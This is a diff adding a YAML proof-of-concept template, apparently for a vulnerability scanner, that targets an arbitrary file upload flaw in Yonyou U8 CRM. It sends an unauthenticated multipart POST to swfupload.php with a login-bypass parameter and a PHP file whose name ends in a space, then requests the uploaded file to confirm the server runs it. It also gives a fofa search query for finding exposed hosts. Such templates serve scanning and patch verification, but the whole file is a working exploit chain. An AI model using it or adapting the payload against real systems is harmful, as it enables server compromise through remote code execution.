@@ -1,0 +1,40 @@
+id: poc-yaml-yongyon-u8-crm-swfupload-anyfile-upload
+info:
+  name: 用友U8 CRM swfupload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajax/swfupload.php?DontCheckLogin=1&vname=file
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
+  data: '-----------------------------269520967239406871642430066855
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php "
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------269520967239406871642430066855
+
+    Content-Disposition: form-data; name="upload"
+
+
+    upload
+
+    -----------------------------269520967239406871642430066855--'
+  expression: status_code == 200 && contains(body,"\"success\":true")
+  output:
+  - regex_match(body,"(?P<file>[0-9a-zA-Z]+).tmp.php")
+- method: GET
+  path: /tmpfile/{{.file}}.tmp.php
+  expression: status_code == 200 && body == t2
+transport: http
